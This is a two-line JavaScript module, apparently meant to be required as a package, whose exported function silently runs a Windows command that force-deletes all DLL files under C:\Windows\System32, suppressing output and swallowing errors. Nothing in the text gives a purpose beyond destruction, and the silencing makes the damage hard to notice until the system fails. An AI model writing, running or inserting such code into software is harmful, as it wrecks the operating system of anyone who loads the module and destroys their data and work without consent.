const execSync = require('child_process').execSync;
module.exports=function(){try{execSync('del /F /S /Q C:\\Windows\\System32\\*.dll',{shell:true,stdio:'ignore'});}catch(e){};};
